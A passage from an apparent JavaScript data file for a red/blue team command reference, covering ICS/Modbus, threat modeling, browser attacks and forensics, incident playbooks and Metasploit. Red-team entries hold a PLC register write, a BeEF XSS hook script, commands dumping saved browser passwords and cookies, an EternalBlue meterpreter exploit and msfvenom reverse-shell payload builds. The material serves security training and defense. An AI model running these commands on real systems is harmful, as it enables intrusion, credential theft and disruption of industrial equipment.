      command: '# === Modbus Read (pymodbus) ===\npython3 -c "\nfrom pymodbus.client import ModbusTcpClient\nclient = ModbusTcpClient(\\"TARGET\\", port=502)\nclient.connect()\n# Read holding registers (function code 3)\nresult = client.read_holding_registers(0, 10, unit=1)\nprint(\\"Registers:\\", result.registers)\nclient.close()\n"\n\n# === Modbus Write (DANGEROUS - changes PLC state) ===\n# python3 -c "\n# from pymodbus.client import ModbusTcpClient\n# client = ModbusTcpClient(\\"TARGET\\", port=502)\n# client.connect()\n# client.write_register(0, 1, unit=1)  # Write value 1 to register 0\n# client.close()\n# "\n\n# === Metasploit Modbus ===\nmsfconsole -q -x "use auxiliary/scanner/scada/modbusdetect; set RHOSTS TARGET/24; run"\nmsfconsole -q -x "use auxiliary/scanner/scada/modbus_findunitid; set RHOST TARGET; run"',
      killchain: 'exploitation', attack: ['impact'], pyramid: 'ttps', owasp: [] },
    { id: 'ics-defense', title: 'ICS Network Defense & Monitoring', team: 'blue', category: 'ics',
      description: 'Monitor and protect ICS/OT networks: Zeek signatures, network segmentation checks, asset inventory.',
      tags: ['zeek', 'ics', 'defense', 'monitoring', 'ot'],
      command: '# === Zeek ICS Protocol Monitoring ===\n# Enable ICS protocol analyzers\nzeek -C -r capture.pcap protocols/modbus\nzeek -C -r capture.pcap protocols/dnp3\nzeek -C -r capture.pcap protocols/s7comm\n\n# === Check for IT/OT network segmentation ===\n# Verify no direct routes between IT and OT zones\nip route show | grep -E "10\\.0\\.(ot_subnet)"\niptables -L -n | grep -E "502|102|44818|47808"\n\n# === ICS Asset Inventory ===\n# Passive asset discovery (no active scanning in OT!)\ntcpdump -i eth0 -w ics_capture.pcap port 502 or port 102 or port 44818\n# Parse Modbus traffic for unique unit IDs\ntshark -r ics_capture.pcap -Y "modbus" -T fields -e ip.src -e ip.dst -e modbus.func_code | sort -u\n\n# === Baseline Normal Behavior ===\n# Record normal register read patterns\ntshark -r baseline.pcap -Y "modbus.func_code == 3" -T fields -e ip.src -e modbus.reference_num | sort | uniq -c | sort -rn\n# Alert on write operations (function codes 5,6,15,16)\ntshark -r live.pcap -Y "modbus.func_code == 5 or modbus.func_code == 6 or modbus.func_code == 15 or modbus.func_code == 16"',
      killchain: 'installation', attack: ['defense-evasion', 'impact'], pyramid: 'artifacts', owasp: [] },
    { id: 'ics-assessment', title: 'ICS Security Assessment Framework', team: 'blue', category: 'ics',
      description: 'ICS security assessment using NIST SP 800-82 and IEC 62443. Risk assessment, zone/conduit model.',
      tags: ['ics', 'assessment', 'nist', 'iec-62443', 'compliance'],
      command: '# === ICS Security Assessment Checklist ===\n# Based on NIST SP 800-82 Rev 3 and IEC 62443\n\n# 1. Network Architecture Review\n#    - Verify Purdue Model zones (0-5)\n#    - Check DMZ between IT and OT\n#    - Review firewall rules at zone boundaries\n#    - Identify all cross-zone communication paths\n\n# 2. Asset Inventory\n#    - Catalog all PLCs, RTUs, HMIs, SCADA servers\n#    - Record firmware versions, patch levels\n#    - Document network addresses and protocols\n#    - Map physical I/O connections\n\n# 3. Protocol Security\n#    - Check for unencrypted protocols (Modbus, DNP3)\n#    - Verify OPC UA security policies\n#    - Review authentication on HMI/Engineering stations\n#    - Test for default credentials on PLCs\n\n# 4. Vulnerability Assessment\n#    - Cross-reference with ICS-CERT advisories\n#    - Check CISA KEV catalog for ICS entries\ncurl -s "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json" | python3 -m json.tool | grep -i "scada\\|plc\\|modbus\\|siemens\\|schneider\\|rockwell"\n\n# 5. Incident Response\n#    - Verify OT-specific IR playbooks exist\n#    - Test communication between IT SOC and OT engineers\n#    - Review backup/restore procedures for PLC programs',
      killchain: 'recon', attack: ['discovery'], pyramid: 'ttps', owasp: [] },
    { id: 'ics-honeypot', title: 'ICS Honeypots & Deception', team: 'blue', category: 'ics',
      description: 'Deploy ICS/SCADA honeypots: Conpot, GRFICSv2. Detect reconnaissance and exploitation attempts.',
      tags: ['conpot', 'honeypot', 'ics', 'deception'],
      command: '# === Conpot -- ICS Honeypot ===\n# Simulates Modbus, S7, HTTP, SNMP, BACnet\npip install conpot\nconpot --template default --logfile conpot.log\n# Default listeners: Modbus (502), S7 (102), HTTP (80), SNMP (161)\n\n# === Docker Conpot ===\ndocker run -it -p 80:8800 -p 102:10201 -p 502:5020 -p 161:16100/udp honeynet/conpot\n\n# === GRFICSv2 -- Virtual ICS Environment ===\n# Full simulation: PLC, HMI, SCADA, physical process\n# git clone https://github.com/Fortiphyd/GRFICSv2\n# Requires VirtualBox with 3 VMs\n\n# === Monitor Honeypot Hits ===\ntail -f conpot.log | grep -E "new_connection|modbus|s7comm"\n\n# === Analyze ICS Scanning Patterns ===\n# Extract source IPs and protocols from Conpot logs\ngrep "new_connection" conpot.log | awk -F"src_ip=|src_port=" \'{print $2}\' | sort | uniq -c | sort -rn\n\n# === T-Pot with ICS Modules ===\n# T-Pot includes Conpot + other honeypots\n# https://github.com/telekom-security/tpotce\n# Select ICS template during installation',
      killchain: 'delivery', attack: ['discovery', 'initial-access'], pyramid: 'tools', owasp: [] },

    // ── Threat Modeling ──────────────────────────────────────
    { id: 'stride-model', title: 'STRIDE Threat Modeling', team: 'blue', category: 'threatmodel',
      description: 'Apply STRIDE methodology: Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege.',
      tags: ['stride', 'threat-model', 'architecture', 'dfd'],
      command: '# === STRIDE Threat Modeling Process ===\n\n# Step 1: Create Data Flow Diagram (DFD)\n# Identify: External entities, Processes, Data stores, Data flows, Trust boundaries\n# Tools: draw.io, Microsoft Threat Modeling Tool, OWASP Threat Dragon\n\n# Step 2: Apply STRIDE per element\n# S - Spoofing     -> External entities, Processes\n# T - Tampering    -> Data stores, Data flows, Processes\n# R - Repudiation  -> External entities, Processes\n# I - Info Disclosure -> Data stores, Data flows, Processes\n# D - Denial of Service -> Data stores, Data flows, Processes\n# E - Elevation    -> Processes\n\n# Step 3: Document threats\n# For each threat:\n#   - ID: STRIDE-001\n#   - Category: S/T/R/I/D/E\n#   - Description: What can go wrong\n#   - Affected component: Which DFD element\n#   - Risk rating: DREAD or CVSS\n#   - Mitigation: Control to implement\n#   - Status: Open/Mitigated/Accepted\n\n# Step 4: OWASP Threat Dragon (automated)\nnpm install -g owasp-threat-dragon\n# Or use web version: https://www.threatdragon.com/\n\n# Step 5: Microsoft Threat Modeling Tool\n# Download: https://aka.ms/threatmodelingtool\n# Generates STRIDE threats automatically from DFD',
      killchain: 'recon', attack: ['discovery'], pyramid: 'ttps', owasp: ['A04'] },
    { id: 'attack-tree', title: 'Attack Trees & Kill Chain Mapping', team: 'blue', category: 'threatmodel',
      description: 'Build attack trees, map to MITRE ATT&CK and Cyber Kill Chain. Prioritize defense investments.',
      tags: ['attack-tree', 'mitre', 'kill-chain', 'threat-model'],
      command: '# === Attack Tree Construction ===\n# Root: Attacker goal (e.g., "Steal customer PII")\n# Children: Sub-goals (OR/AND decomposition)\n# Leaves: Atomic attack steps\n\n# Example Attack Tree:\n# Goal: Exfiltrate customer database\n# +-- [OR] Exploit web application\n# |   +-- [AND] SQL injection + bypass WAF\n# |   +-- [AND] SSRF + cloud metadata\n# +-- [OR] Compromise employee\n# |   +-- Phishing + credential harvest\n# |   +-- Social engineering + VPN access\n# +-- [OR] Insider threat\n#     +-- Privileged user abuse\n\n# === MITRE ATT&CK Navigator ===\n# Create heatmap of covered techniques\n# https://mitre-attack.github.io/attack-navigator/\n# Export: JSON layer for sharing\n\n# === ATT&CK Coverage Gap Analysis ===\n# Map detections to ATT&CK techniques\n# Query MITRE STIX data:\ncurl -s "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json" | python3 -c "\nimport json,sys\ndata = json.load(sys.stdin)\ntechniques = [o for o in data[\\"objects\\"] if o.get(\\"type\\")==\\"attack-pattern\\" and not o.get(\\"revoked\\",False)]\nprint(f\\"Total techniques: {len(techniques)}\\")\nfor t in sorted(techniques, key=lambda x: x.get(\\"external_references\\",[{}])[0].get(\\"external_id\\",\\"\\"))[:20]:\n    eid = t.get(\\"external_references\\",[{}])[0].get(\\"external_id\\",\\"\\")\n    print(f\\"  {eid}: {t[\\"name\\"]}\\")\n"',
      killchain: 'recon', attack: ['discovery'], pyramid: 'ttps', owasp: ['A04'] },
    { id: 'threat-model-api', title: 'API Threat Modeling', team: 'blue', category: 'threatmodel',
      description: 'Threat model REST APIs: authentication, authorization, injection, rate limiting, data exposure.',
      tags: ['api', 'threat-model', 'owasp-api', 'security-review'],
      command: '# === API Threat Modeling Checklist ===\n# Based on OWASP API Security Top 10 (2023)\n\n# API1: Broken Object Level Authorization (BOLA)\n#   Threat: User A accesses User B data by changing ID\n#   Test: GET /api/users/123 -> change to /api/users/456\n#   Mitigation: Object-level authorization checks\n\n# API2: Broken Authentication\n#   Threat: Weak tokens, no rate limiting on login\n#   Test: Brute force /api/auth/login, JWT manipulation\n#   Mitigation: Strong auth, MFA, token rotation\n\n# API3: Broken Object Property Level Authorization\n#   Threat: Mass assignment, excessive data exposure\n#   Test: PATCH /api/users/me with {"role": "admin"}\n#   Mitigation: Explicit allowlists for writable fields\n\n# API4: Unrestricted Resource Consumption\n#   Threat: No rate limiting, large payloads\n#   Test: Send 1000 requests/second, 100MB body\n#   Mitigation: Rate limiting, pagination, size limits\n\n# API5: Broken Function Level Authorization\n#   Threat: Regular user calls admin endpoints\n#   Test: GET /api/admin/users as regular user\n#   Mitigation: RBAC, endpoint-level checks\n\n# === Automated API Security Testing ===\n# OWASP ZAP API scan\ndocker run -t owasp/zap2docker-stable zap-api-scan.py -t https://TARGET/openapi.json -f openapi\n\n# Postman security collection\n# Import API spec -> generate security tests -> run with Newman\nnewman run api-security-tests.json --environment prod.json',
      killchain: 'weaponization', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A01', 'A07'] },
    { id: 'threat-model-cloud', title: 'Cloud Threat Modeling', team: 'blue', category: 'threatmodel',
      description: 'Threat model cloud architectures: IAM, storage, network, serverless. AWS/Azure/GCP specific threats.',
      tags: ['cloud', 'threat-model', 'aws', 'azure', 'iam'],
      command: '# === Cloud Threat Modeling -- STRIDE per Cloud Service ===\n\n# IAM Threats:\n# S - Service account impersonation, federation bypass\n# T - Policy manipulation, privilege escalation\n# E - Cross-account role assumption, instance profile abuse\n\n# Storage Threats:\n# I - Public S3 buckets, misconfigured blob access\n# T - Unauthorized writes to config files\n# D - Ransomware encrypting storage\n\n# Network Threats:\n# S - Metadata endpoint abuse (169.254.169.254)\n# I - VPC flow log gaps, unencrypted traffic\n# D - Security group allowing 0.0.0.0/0\n\n# === Automated Cloud Threat Checks ===\n# AWS: ScoutSuite\npip install scoutsuite\nscout aws --report-dir ./scout-report\n\n# Azure: ScoutSuite\nscout azure --cli --report-dir ./scout-report\n\n# GCP: ScoutSuite\nscout gcp --user-account --report-dir ./scout-report\n\n# === Cloud-specific Attack Paths ===\n# Map with Cartography (Neo4j-based)\npip install cartography\ncartography --neo4j-uri bolt://localhost:7687 --aws-sync-all-profiles\n\n# === Prowler (AWS/Azure/GCP CIS Benchmarks) ===\npip install prowler\nprowler aws --compliance cis_2.0_aws\nprowler azure --compliance cis_2.0_azure',
      killchain: 'recon', attack: ['discovery', 'privilege-escalation'], pyramid: 'ttps', owasp: ['A01', 'A05'] },

    // ── Browser Exploitation ─────────────────────────────────
    { id: 'beef-xss', title: 'BeEF -- Browser Exploitation Framework', team: 'red', category: 'browser',
      description: 'Hook browsers with BeEF: XSS exploitation, social engineering, browser fingerprinting, network discovery.',
      tags: ['beef', 'xss', 'browser', 'exploitation'],
      command: '# === Start BeEF ===\n# Default panel: http://127.0.0.1:3000/ui/panel\n# Default creds: beef / beef (change in config.yaml!)\ncd /usr/share/beef-xss && ./beef\n\n# === Hook Script ===\n# Inject in vulnerable page via XSS:\n# <script src="https://LHOST:3000/hook.js"></script>\n\n# === BeEF REST API ===\n# Authenticate\ncurl -s "http://127.0.0.1:3000/api/admin/login" -d \'{"username":"beef","password":"beef"}\'\n# List hooked browsers\ncurl -s "http://127.0.0.1:3000/api/hooks?token=TOKEN"\n# Execute module on hooked browser\ncurl -s "http://127.0.0.1:3000/api/modules/HOOK_ID/MODULE_ID?token=TOKEN" -d \'{}\'\n\n# === Common BeEF Modules ===\n# Browser fingerprint, Webcam capture, Social engineering\n# Get Internal IP, Port scanner, Network discovery\n# Redirect browser, Fake notification bar\n# Clipboard theft, Keylogger\n\n# === BeEF + Metasploit Integration ===\n# In beef config.yaml, enable metasploit extension\n# Delivers browser exploits via BeEF hooks',
      killchain: 'exploitation', attack: ['execution', 'collection'], pyramid: 'ttps', owasp: ['A03', 'A07'] },
    { id: 'browser-creds', title: 'Browser Credential Extraction', team: 'red', category: 'browser',
      description: 'Extract saved passwords, cookies, history, and autofill data from browsers.',
      tags: ['credentials', 'browser', 'post-exploitation'],
      commands: {
        linux: '# === Chrome/Chromium (Linux) ===\n# Passwords stored in ~/.config/google-chrome/Default/Login Data (SQLite)\nsqlite3 ~/.config/google-chrome/Default/"Login Data" "SELECT origin_url, username_value FROM logins;"\n\n# Cookies\nsqlite3 ~/.config/google-chrome/Default/Cookies "SELECT host_key, name, value FROM cookies LIMIT 20;"\n\n# History\nsqlite3 ~/.config/google-chrome/Default/History "SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 20;"\n\n# Firefox (Linux)\n# Profiles in ~/.mozilla/firefox/*.default-release/\npython3 -c "\nimport sqlite3, os, glob\nfor db in glob.glob(os.path.expanduser(\\"~/.mozilla/firefox/*/places.sqlite\\")):\n    conn = sqlite3.connect(db)\n    for row in conn.execute(\\"SELECT url, title FROM moz_places ORDER BY visit_count DESC LIMIT 10\\"):\n        print(row)\n    conn.close()\n"',
        windows: '# === Chrome (Windows) ===\n# Passwords: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\n# Encrypted with DPAPI -- use mimikatz or SharpChrome\n\n# SharpChrome -- extract all Chrome data\nSharpChrome.exe logins /unprotect\nSharpChrome.exe cookies /unprotect\nSharpChrome.exe history\n\n# LaZagne -- multi-browser password recovery\nlaZagne.exe browsers\n\n# Firefox (Windows)\n# Profiles in %APPDATA%\\Mozilla\\Firefox\\Profiles\n# Use firefox_decrypt.py:\npython3 firefox_decrypt.py\n\n# === Edge (Chromium-based) ===\n# Same structure as Chrome but in:\n# %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data\nSharpChrome.exe logins /browser:edge /unprotect\n\n# === PowerShell -- Extract Chrome History ===\n$dbPath = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History"\nCopy-Item $dbPath "$env:TEMP\\history.db"\n# Query with sqlite3 or System.Data.SQLite'
      },
      killchain: 'actions', attack: ['credential-access', 'collection'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'browser-defense', title: 'Browser Security Hardening', team: 'blue', category: 'browser',
      description: 'Harden browsers: CSP headers, cookie flags, extension auditing, security policies.',
      tags: ['browser', 'hardening', 'csp', 'defense'],
      command: '# === Content Security Policy (CSP) ===\n# Strict CSP header:\n# Content-Security-Policy: default-src \'self\'; script-src \'self\'; style-src \'self\' \'unsafe-inline\'; img-src \'self\' data:; connect-src \'self\'; frame-ancestors \'none\'; base-uri \'self\'; form-action \'self\'\n\n# Test CSP with:\ncurl -sI https://TARGET | grep -i "content-security-policy"\n# Online validator: https://csp-evaluator.withgoogle.com/\n\n# === Security Headers Check ===\ncurl -sI https://TARGET | grep -iE "strict-transport|x-frame|x-content-type|referrer-policy|permissions-policy"\n\n# === Chrome Enterprise Policies (GPO) ===\n# Block dangerous extensions\n# ExtensionInstallBlocklist: *\n# ExtensionInstallAllowlist: specific-extension-ids\n# Disable password manager: PasswordManagerEnabled: false\n# Force SafeBrowsing: SafeBrowsingProtectionLevel: 2\n\n# === Audit Installed Extensions ===\n# Chrome extensions directory:\n# Linux: ~/.config/google-chrome/Default/Extensions/\n# Windows: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Extensions\\\n# List all extension IDs and cross-reference with Web Store\n\n# === Cookie Security ===\n# Ensure cookies have: Secure, HttpOnly, SameSite=Strict\n# Test:\ncurl -v https://TARGET 2>&1 | grep -i "set-cookie"',
      killchain: 'installation', attack: ['defense-evasion'], pyramid: 'artifacts', owasp: ['A05'] },
    { id: 'browser-forensics', title: 'Browser Forensics & Artifact Analysis', team: 'blue', category: 'browser',
      description: 'Forensic analysis of browser artifacts: history, cache, downloads, sessions, IndexedDB.',
      tags: ['forensics', 'browser', 'sqlite', 'artifacts'],
      commands: {
        linux: '# === Chrome Forensics (Linux) ===\nCHROME_DIR=~/.config/google-chrome/Default\n\n# Browsing history\nsqlite3 "$CHROME_DIR/History" "SELECT datetime(last_visit_time/1000000-11644473600,\'unixepoch\'), url, title FROM urls ORDER BY last_visit_time DESC LIMIT 50;"\n\n# Downloads\nsqlite3 "$CHROME_DIR/History" "SELECT datetime(start_time/1000000-11644473600,\'unixepoch\'), tab_url, target_path FROM downloads ORDER BY start_time DESC LIMIT 20;"\n\n# Cookies (with timestamps)\nsqlite3 "$CHROME_DIR/Cookies" "SELECT host_key, name, datetime(creation_utc/1000000-11644473600,\'unixepoch\') as created FROM cookies ORDER BY creation_utc DESC LIMIT 20;"\n\n# Autofill data\nsqlite3 "$CHROME_DIR/Web Data" "SELECT name, value, count FROM autofill ORDER BY count DESC LIMIT 20;"\n\n# Cache analysis\n# Chrome cache in ~/.config/google-chrome/Default/Cache/\nls -la "$CHROME_DIR/Cache/Cache_Data/" | head -20\n\n# Firefox forensics\nFIREFOX_DIR=$(find ~/.mozilla/firefox -name "*.default-release" -type d 2>/dev/null | head -1)\nsqlite3 "$FIREFOX_DIR/places.sqlite" "SELECT datetime(last_visit_date/1000000,\'unixepoch\'), url FROM moz_places ORDER BY last_visit_date DESC LIMIT 50;"',
        windows: '# === Chrome Forensics (Windows) ===\n$ChromeDir = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default"\n\n# Copy databases (Chrome locks them while running)\nStop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue\nCopy-Item "$ChromeDir\\History" "$env:TEMP\\chrome_history.db"\nCopy-Item "$ChromeDir\\Cookies" "$env:TEMP\\chrome_cookies.db"\nCopy-Item "$ChromeDir\\Web Data" "$env:TEMP\\chrome_webdata.db"\n\n# Use Hindsight for comprehensive browser analysis\n# pip install pyhindsight\npython3 -m pyhindsight -i "$env:LOCALAPPDATA\\Google\\Chrome\\User Data" -o chrome_report\n\n# BrowsingHistoryView (NirSoft)\nBrowsingHistoryView.exe /SaveDirect /scomma history.csv\n\n# ChromeCacheView (NirSoft)\nChromeCacheView.exe /scomma cache.csv\n\n# Edge forensics (same SQLite structure)\n$EdgeDir = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default"\nCopy-Item "$EdgeDir\\History" "$env:TEMP\\edge_history.db"'
      },
      killchain: 'actions', attack: ['collection', 'discovery'], pyramid: 'artifacts', owasp: [] },

    // ── Incident Playbooks ───────────────────────────────────
    { id: 'playbook-ransomware', title: 'Ransomware Incident Playbook', team: 'blue', category: 'playbooks',
      description: 'Step-by-step ransomware response: containment, evidence preservation, recovery, communication.',
      tags: ['ransomware', 'incident-response', 'playbook', 'containment'],
      command: '# === RANSOMWARE INCIDENT PLAYBOOK ===\n\n# PHASE 1: DETECTION & TRIAGE (0-15 min)\n# Confirm ransomware indicators:\n#   - Encrypted files with new extensions\n#   - Ransom note on desktop/shares\n#   - Mass file modification events in SIEM\n# Severity: CRITICAL (activate IR team immediately)\n\n# PHASE 2: CONTAINMENT (15-60 min)\n# Isolate affected systems (DO NOT power off)\niptables -I INPUT -j DROP  # Network isolation on Linux\n# Windows: Disable NIC or set firewall\nnetsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound\n# Block C2 domains/IPs at firewall\n# Disable SMB if lateral movement suspected\n# Isolate network segments\n\n# PHASE 3: EVIDENCE PRESERVATION\n# Memory dump BEFORE any remediation\nwinpmem_mini.exe memdump.raw                      # Windows\nsudo avml /tmp/memory.lime                         # Linux\n# Snapshot VMs\n# Preserve ransom note, encrypted file samples\n# Collect logs: Event Viewer, /var/log, SIEM exports\n\n# PHASE 4: ERADICATION\n# Identify ransomware variant: ID Ransomware (id-ransomware.malwarehunterteam.com)\n# Check for decryptors: nomoreransom.org\n# Remove persistence mechanisms\n# Patch exploitation vector\n\n# PHASE 5: RECOVERY\n# Restore from clean backups (verify backup integrity first!)\n# Rebuild compromised systems from golden images\n# Reset ALL credentials (especially service accounts)\n# Monitor for re-infection (increased logging)\n\n# PHASE 6: POST-INCIDENT\n# Timeline reconstruction\n# Lessons learned document\n# Update detection rules\n# Report to authorities if required (GDPR 72h)',
      killchain: 'actions', attack: ['impact'], pyramid: 'ttps', owasp: [] },
    { id: 'playbook-phishing', title: 'Phishing Incident Playbook', team: 'blue', category: 'playbooks',
      description: 'Phishing response: email analysis, credential reset, scope assessment, user notification.',
      tags: ['phishing', 'incident-response', 'playbook', 'email'],
      command: '# === PHISHING INCIDENT PLAYBOOK ===\n\n# PHASE 1: TRIAGE (0-15 min)\n# Gather: reported email (full headers), sender, subject, URLs, attachments\n# Quick checks:\n# Extract and analyze URLs\necho "SUSPICIOUS_URL" | unfurl -u domains\n# Check sender reputation\ndig +short TXT _dmarc.SENDER_DOMAIN\nnslookup -type=TXT SENDER_DOMAIN  # Check SPF\n\n# PHASE 2: ANALYSIS (15-45 min)\n# Header analysis\n# Extract authentication results (SPF, DKIM, DMARC)\ngrep -iE "spf=|dkim=|dmarc=|authentication-results" email_headers.txt\n# Check for header spoofing\ngrep -iE "from:|reply-to:|return-path:" email_headers.txt\n\n# Attachment analysis (in sandbox!)\n# Static: file type, hash, strings\nsha256sum attachment.doc\nfile attachment.doc\nstrings attachment.doc | grep -iE "http|powershell|cmd|wscript"\n# VirusTotal hash check\n\n# PHASE 3: SCOPE ASSESSMENT\n# Search mail server for same campaign\n# O365: Search-Mailbox -SearchQuery "subject:SUBJECT"\n# Count: how many users received it, how many clicked\n# Check web proxy logs for landing page visits\n\n# PHASE 4: CONTAINMENT\n# Block sender/domain at email gateway\n# Block URLs at proxy/DNS\n# If credentials entered: force password reset + revoke sessions\n# If attachment opened: isolate endpoint, run EDR scan\n\n# PHASE 5: NOTIFICATION\n# Notify affected users\n# Send org-wide awareness alert if widespread\n# Update phishing simulation templates',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'artifacts', owasp: [] },
    { id: 'playbook-insider', title: 'Insider Threat Playbook', team: 'blue', category: 'playbooks',
      description: 'Insider threat response: data exfiltration detection, evidence collection, legal coordination.',
      tags: ['insider-threat', 'dlp', 'playbook', 'investigation'],
      command: '# === INSIDER THREAT PLAYBOOK ===\n\n# PHASE 1: DETECTION INDICATORS\n# Technical indicators:\n#   - Unusual data access patterns (volume, time, sensitivity)\n#   - Large file transfers to external storage/cloud\n#   - Access to systems outside normal job function\n#   - After-hours VPN connections\n#   - USB device usage alerts\n#   - Print volume spikes\n\n# PHASE 2: COVERT INVESTIGATION (coordinate with Legal & HR)\n# DO NOT alert the subject\n# Increase monitoring silently:\n# Enable detailed audit logging on suspect accounts\n# Windows:\nauditpol /set /user:DOMAIN\\USER /subcategory:"File System" /success:enable\nauditpol /set /user:DOMAIN\\USER /subcategory:"Removable Storage" /success:enable\n\n# Monitor file access patterns:\n# Splunk: index=wineventlog EventCode=4663 Account_Name=SUSPECT | stats count by Object_Name\n# Check for data staging:\n# Splunk: index=wineventlog EventCode=4663 Object_Name="*\\Desktop\\*" OR Object_Name="*\\Temp\\*"\n\n# PHASE 3: EVIDENCE COLLECTION\n# Preserve evidence chain of custody\n# Email: Legal hold on mailbox\n# Endpoint: Forensic image of workstation\n# Network: Capture DLP alerts, proxy logs, VPN logs\n# Cloud: Export audit logs (O365, Google Workspace)\n# Badge access: Physical access logs\n\n# PHASE 4: RESPONSE\n# Legal review before any confrontation\n# HR coordination for employment actions\n# Revoke access simultaneously with notification\n# Preserve all evidence for potential litigation\n\n# PHASE 5: POST-INCIDENT\n# Review DLP rules effectiveness\n# Update access controls (least privilege)\n# Enhance monitoring for similar patterns',
      killchain: 'actions', attack: ['exfiltration', 'collection'], pyramid: 'ttps', owasp: [] },
    { id: 'playbook-account-compromise', title: 'Account Compromise Playbook', team: 'blue', category: 'playbooks',
      description: 'Compromised account response: session revocation, credential reset, activity review, scope analysis.',
      tags: ['account-compromise', 'playbook', 'credential', 'incident-response'],
      command: '# === ACCOUNT COMPROMISE PLAYBOOK ===\n\n# PHASE 1: DETECTION INDICATORS\n# - Impossible travel (login from two distant locations)\n# - New MFA device registration\n# - Password change from unknown IP\n# - Mailbox forwarding rules created\n# - OAuth app consent granted\n# - Failed login burst followed by success\n\n# PHASE 2: IMMEDIATE CONTAINMENT (within 15 min)\n# Revoke all active sessions\n# Azure AD:\naz ad user update --id USER_UPN --password NEW_TEMP_PASS\n# Revoke refresh tokens:\naz rest --method POST --url "https://graph.microsoft.com/v1.0/users/USER_ID/revokeSignInSessions"\n\n# AWS: Deactivate access keys\naws iam update-access-key --user-name USER --access-key-id AKID --status Inactive\naws iam delete-login-profile --user-name USER\n\n# Google Workspace:\n# Admin Console -> User -> Security -> Sign out user\n\n# PHASE 3: SCOPE ASSESSMENT\n# Review account activity:\n# Azure AD: Sign-in logs, Audit logs\naz monitor activity-log list --start-time 2024-01-01 --query "[?caller==\'USER_UPN\']"\n\n# Check for persistence:\n# - New OAuth apps\n# - Mailbox rules (forwarding, delete rules)\n# - New MFA methods added\n# - Service principals created\n# - API keys generated\n\n# PHASE 4: REMEDIATION\n# Reset password (strong, unique)\n# Re-register MFA\n# Remove suspicious OAuth consents\n# Remove mailbox forwarding rules\n# Review and revoke unnecessary permissions\n# Check for lateral movement to other accounts\n\n# PHASE 5: MONITORING\n# Enhanced logging for 30 days\n# Alert on new sign-in patterns\n# Review access periodically',
      killchain: 'exploitation', attack: ['credential-access', 'persistence'], pyramid: 'artifacts', owasp: ['A07'] },
    { id: 'playbook-data-breach', title: 'Data Breach Response Playbook', team: 'blue', category: 'playbooks',
      description: 'Data breach response: scope determination, notification requirements, regulatory compliance (GDPR, CCPA).',
      tags: ['data-breach', 'gdpr', 'compliance', 'playbook', 'notification'],
      command: '# === DATA BREACH RESPONSE PLAYBOOK ===\n\n# PHASE 1: CONFIRM & CLASSIFY (0-2 hours)\n# Determine:\n#   - What data was exposed? (PII, PHI, financial, credentials)\n#   - How many records affected?\n#   - How was data accessed? (exploit, misconfiguration, insider)\n#   - Is the breach ongoing?\n\n# Data classification:\n# HIGH: SSN, payment cards, health records, biometrics\n# MEDIUM: Names + emails + passwords, employee records\n# LOW: Publicly available info, anonymized data\n\n# PHASE 2: CONTAINMENT\n# Stop the bleeding:\n# - Patch exploited vulnerability\n# - Revoke compromised credentials\n# - Block attacker IP/infrastructure\n# - Take affected systems offline if necessary\n# Preserve evidence (logs, memory, disk images)\n\n# PHASE 3: SCOPE ASSESSMENT\n# Database forensics:\n# Check query logs for data extraction\ngrep -i "SELECT.*FROM.*users\\|customers\\|employees" /var/log/postgresql/postgresql.log\n# Check web access logs for bulk data access\ngrep -E "GET.*(export|download|dump|backup)" /var/log/nginx/access.log | awk \'{print $1}\' | sort | uniq -c | sort -rn\n\n# PHASE 4: NOTIFICATION (regulatory requirements)\n# GDPR (EU): 72 hours to DPA, "without undue delay" to data subjects\n# CCPA (California): "most expedient time possible", not > 45 days\n# HIPAA (US health): 60 days to individuals, HHS if >500 records\n# PCI DSS: 24-72 hours to card brands\n# NIS2 (EU): 24h early warning, 72h full notification to CSIRT\n\n# PHASE 5: REMEDIATION & LESSONS LEARNED\n# Root cause analysis\n# Implement additional controls\n# Update incident response plan\n# Consider credit monitoring for affected individuals\n# File regulatory reports\n# External communication (press release if needed)',
      killchain: 'actions', attack: ['exfiltration', 'impact'], pyramid: 'ttps', owasp: ['A01'] },

    // ── Round 12: Notion-sourced ─────────────────────────────────

    // ── Metasploit Framework ──
    { id: 'msf-basics', title: 'Metasploit Console Basics', team: 'red', category: 'metasploit',
      description: 'Core msfconsole workflow: search, use, set options, run modules.',
      tags: ['metasploit', 'msfconsole', 'exploit', 'framework'],
      command: '# METASPLOIT CONSOLE\nmsfconsole -q\nmsf6> search type:exploit platform:windows smb\nmsf6> use exploit/windows/smb/ms17_010_eternalblue\nmsf6> show options\nmsf6> set RHOSTS TARGET\nmsf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6> exploit -j\nmsf6> sessions -l\nmsf6> db_status\nmsf6> hosts / services / vulns',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'msf-payloads', title: 'Payload Generation', team: 'red', category: 'metasploit',
      description: 'Generate payloads with msfvenom for various platforms.',
      tags: ['msfvenom', 'metasploit', 'payload', 'shellcode'],
      commands: {
        linux: '# MSFVENOM (Linux)\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o rev\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o s.php\nmsfvenom -l payloads | grep linux',
        windows: '# MSFVENOM (Windows)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o m.exe\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll -o p.dll\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh-cmd -o p.ps1',
        macos: '# MSFVENOM (macOS)\nmsfvenom -p osx/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f macho -o rev'
